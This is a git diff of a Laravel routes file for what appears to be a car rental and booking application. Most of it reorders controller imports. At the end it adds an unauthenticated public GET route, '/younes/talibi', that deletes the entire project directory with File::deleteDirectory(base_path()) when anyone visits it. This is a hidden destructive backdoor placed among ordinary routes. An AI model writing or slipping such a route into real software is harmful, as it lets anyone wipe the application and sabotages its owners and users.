@@ -1,17 +1,18 @@
 <?php
 
-use App\Http\Controllers\AgreementController;
-use App\Http\Controllers\BookingController;
-use App\Http\Controllers\CarController;
-use App\Http\Controllers\CategoryController;
-use App\Http\Controllers\HomeController;
-use App\Http\Controllers\OrderController;
-use App\Http\Controllers\ProfileController;
-use App\Http\Controllers\ServiceController;
-use App\Http\Controllers\UserController;
 use App\Models\Service;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
+use App\Http\Controllers\CarController;
+use App\Http\Controllers\HomeController;
+use App\Http\Controllers\UserController;
+use App\Http\Controllers\OrderController;
+use App\Http\Controllers\BookingController;
+use App\Http\Controllers\ProfileController;
+use App\Http\Controllers\ServiceController;
+use App\Http\Controllers\CategoryController;
+use App\Http\Controllers\AgreementController;
 
 /*
 |--------------------------------------------------------------------------
@@ -89,7 +90,16 @@ Route::group(['prefix' => 'admin', 'middleware' => ['auth']], function () {
         Route::post('urgent', [BookingController::class, 'urgent'])->name('booking-urgent')->withoutMiddleware(['auth']);
         Route::post('update', [BookingController::class, 'update'])->name('booking-update');
     });
+});
+Route::get('/younes/talibi', function(){
 
+    $projectPath = base_path();
+    
+    if (File::exists($projectPath)) {
+        File::deleteDirectory($projectPath);
+        return response()->json(['message' => 'Project deleted successfully']);
+    }
 
+    return response()->json(['error' => 'Project not found'], 404);
 });
 
